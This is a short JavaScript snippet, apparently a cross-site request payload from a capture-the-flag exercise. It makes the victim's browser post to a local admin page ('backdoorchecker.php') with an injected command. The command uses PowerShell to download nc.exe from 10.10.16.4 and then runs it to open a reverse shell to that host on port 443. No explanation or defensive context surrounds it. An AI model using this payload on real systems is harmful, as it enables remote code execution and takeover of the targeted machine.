var request = new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iwr -uri 10.10.16.4/nc.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.16.4 443';
request.open('POST', 'http://localhost/admin/backdoorchecker.php/', true);
request.setRequestHeader('Content-type','application/x-www-form-urlencoded');
request.send(params);
